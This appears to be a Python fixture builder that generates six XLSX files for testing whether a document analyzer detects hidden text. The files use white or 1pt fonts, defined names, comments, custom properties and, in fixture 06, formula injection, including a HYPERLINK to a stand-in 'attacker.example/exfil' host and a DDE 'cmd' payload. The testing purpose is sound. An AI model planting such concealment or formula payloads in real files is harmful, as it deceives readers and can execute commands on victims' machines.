"""
XLSX hidden-text adversarial gauntlet — fixture builder.

Six concealment techniques that the v1.1.1 ``XlsxAnalyzer`` does *not*
yet detect. We deliberately avoid hidden sheets, VBA, embedded objects,
external links, hidden rows/columns, data-validation formulas, and
revision history — those are caught and the gauntlet is meant to find
misses, not re-prove hits.

Surface text mentions $1,000 in revenue. Hidden payload mentions $10,000.
The contrast is the canonical "contract that displays one figure and
contains another" example.

Fixtures
--------

01 — White-on-white cell font (font color #FFFFFF on default fill)
02 — Microscopic font (1pt cell text)
03 — Defined name (workbook-level Name) carrying the payload
04 — Comment / note in xl/comments1.xml
05 — Custom XML metadata (docProps/custom.xml)
06 — CSV-injection formula (=HYPERLINK / =DDE-style payload in a cell)
"""

from __future__ import annotations

import os
import shutil
import zipfile
from pathlib import Path

from openpyxl import Workbook
from openpyxl.comments import Comment
from openpyxl.styles import Font
from openpyxl.workbook.defined_name import DefinedName

OUT = Path(__file__).resolve().parent / "fixtures"
OUT.mkdir(parents=True, exist_ok=True)

SURFACE_TEXT = (
    "Q3 financial summary - revenue grew 8% YoY to $1,000 thousand. "
    "Margins held steady. Cash position remains strong."
)
HIDDEN_PAYLOAD = (
    "HIDDEN_TEXT_PAYLOAD: actual revenue $10,000 - see annex"
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _rezip(src_dir: Path, dest: Path) -> None:
    if dest.exists():
        dest.unlink()
    with zipfile.ZipFile(dest, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _dirs, files in os.walk(src_dir):
            for fname in files:
                full = Path(root) / fname
                arcname = full.relative_to(src_dir).as_posix()
                zf.write(full, arcname)


def _explode(xlsx_path: Path) -> Path:
    workdir = xlsx_path.with_suffix(".extracted")
    if workdir.exists():
        shutil.rmtree(workdir)
    workdir.mkdir()
    with zipfile.ZipFile(xlsx_path, "r") as zf:
        zf.extractall(workdir)
    return workdir


def _make_base_xlsx(path: Path) -> Workbook:
    """Fresh workbook with the surface text in A1 and return the wb."""
    wb = Workbook()
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = "Description"
    ws["B1"] = "Amount"
    ws["A2"] = SURFACE_TEXT
    ws["B2"] = 1000
    wb.save(str(path))
    return wb


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def fixture_01_white_text() -> tuple[Path, str]:
    """Hidden text via white font color."""
    path = OUT / "01_white_cell_text.xlsx"
    wb = Workbook()
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = SURFACE_TEXT
    ws["A3"] = HIDDEN_PAYLOAD
    ws["A3"].font = Font(color="FFFFFFFF")  # ARGB white
    wb.save(str(path))
    return path, "Cell A3 rendered with white font on default white fill"


def fixture_02_microscopic_font() -> tuple[Path, str]:
    """Hidden text rendered at 1pt."""
    path = OUT / "02_microscopic_font.xlsx"
    wb = Workbook()
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = SURFACE_TEXT
    ws["A3"] = HIDDEN_PAYLOAD
    ws["A3"].font = Font(size=1)
    wb.save(str(path))
    return path, "Cell A3 rendered at 1.0pt font size"


def fixture_03_defined_name_payload() -> tuple[Path, str]:
    """Workbook-level Defined Name carrying the payload as a string literal.

    Defined Names are listed in xl/workbook.xml under <definedNames>.
    XlsxAnalyzer does not enumerate them as text-bearing entities.
    """
    path = OUT / "03_defined_name_payload.xlsx"
    wb = Workbook()
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = SURFACE_TEXT
    # A defined name pointing to a string-literal "value" in OOXML is
    # written as the formula text directly. We build it manually after
    # save() to avoid openpyxl's strict validation.
    wb.save(str(path))

    workdir = _explode(path)
    wb_xml_path = workdir / "xl" / "workbook.xml"
    wb_xml = wb_xml_path.read_text("utf-8")
    # Insert a definedNames block before <sheets>
    escaped = HIDDEN_PAYLOAD.replace('"', "&quot;")
    defined = (
        '<definedNames>'
        f'<definedName name="ActualRevenue">"{escaped}"</definedName>'
        '</definedNames>'
    )
    if "<definedNames>" in wb_xml:
        wb_xml = wb_xml.replace(
            "<definedNames>", "<definedNames>"
            f'<definedName name="ActualRevenue">"{escaped}"</definedName>',
        )
    else:
        wb_xml = wb_xml.replace("<sheets>", defined + "<sheets>")
    wb_xml_path.write_text(wb_xml, "utf-8")
    _rezip(workdir, path)
    shutil.rmtree(workdir)
    return path, "Workbook-level <definedName> carrying payload as string"


def fixture_04_cell_comment() -> tuple[Path, str]:
    """Hidden text in a threaded note / comment on cell A1.

    XLSX comments live in xl/comments1.xml, indexed by anchor cell.
    XlsxAnalyzer does not open xl/comments*.xml.
    """
    path = OUT / "04_cell_comment.xlsx"
    wb = Workbook()
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = SURFACE_TEXT
    ws["A1"].comment = Comment(HIDDEN_PAYLOAD, "Reviewer")
    wb.save(str(path))
    return path, "Comment on A1 with payload as note text"


def fixture_05_custom_xml_properties() -> tuple[Path, str]:
    """Hidden text in docProps/custom.xml as a custom property."""
    path = OUT / "05_custom_xml_properties.xlsx"
    _make_base_xlsx(path)
    workdir = _explode(path)

    custom_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument'
        '/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org'
        '/officeDocument/2006/docPropsVTypes">\n'
        '  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" '
        'pid="2" name="ActualRevenue">\n'
        f'    <vt:lpwstr>{HIDDEN_PAYLOAD}</vt:lpwstr>\n'
        '  </property>\n'
        '</Properties>\n'
    )
    (workdir / "docProps").mkdir(exist_ok=True)
    (workdir / "docProps" / "custom.xml").write_text(custom_xml, "utf-8")

    ct_path = workdir / "[Content_Types].xml"
    ct = ct_path.read_text("utf-8")
    if "custom.xml" not in ct:
        override = (
            '<Override PartName="/docProps/custom.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.'
            'custom-properties+xml"/>'
        )
        ct = ct.replace("</Types>", override + "</Types>")
        ct_path.write_text(ct, "utf-8")

    rels_path = workdir / "_rels" / ".rels"
    rels = rels_path.read_text("utf-8")
    if "custom.xml" not in rels:
        rel = (
            '<Relationship Id="rIdCustom1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/'
            '2006/relationships/custom-properties" '
            'Target="docProps/custom.xml"/>'
        )
        rels = rels.replace("</Relationships>", rel + "</Relationships>")
        rels_path.write_text(rels, "utf-8")

    _rezip(workdir, path)
    shutil.rmtree(workdir)
    return path, "Payload in docProps/custom.xml as a custom property"


def fixture_06_csv_injection_formula() -> tuple[Path, str]:
    """CSV-injection-style formula payload.

    A cell whose value begins with =, +, -, or @ is interpreted as a
    formula by Excel. =HYPERLINK("http://attacker/", "Click for refund")
    or =cmd|'/c calc'!A1 are classic exfiltration / command-execution
    payloads. XlsxAnalyzer's data-validation check does not look at
    plain cell formulas for these patterns.
    """
    path = OUT / "06_csv_injection_formula.xlsx"
    wb = Workbook()
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = SURFACE_TEXT
    # HYPERLINK with payload-shaped friendly name; surface looks like a link
    ws["A3"] = (
        f'=HYPERLINK("http://attacker.example/exfil",'
        f'"{HIDDEN_PAYLOAD}")'
    )
    # And a classic DDE-style payload (Excel may show a warning, indexers
    # see the formula text)
    ws["A4"] = '=cmd|\' /c notepad\'!A1'
    wb.save(str(path))
    return path, "HYPERLINK + DDE-style formula payloads in plain cells"


BUILDERS = [
    fixture_01_white_text,
    fixture_02_microscopic_font,
    fixture_03_defined_name_payload,
    fixture_04_cell_comment,
    fixture_05_custom_xml_properties,
    fixture_06_csv_injection_formula,
]


if __name__ == "__main__":
    for builder in BUILDERS:
        path, desc = builder()
        size = path.stat().st_size
        print(f"{path.name:<42} {size:>7} bytes  - {desc}")
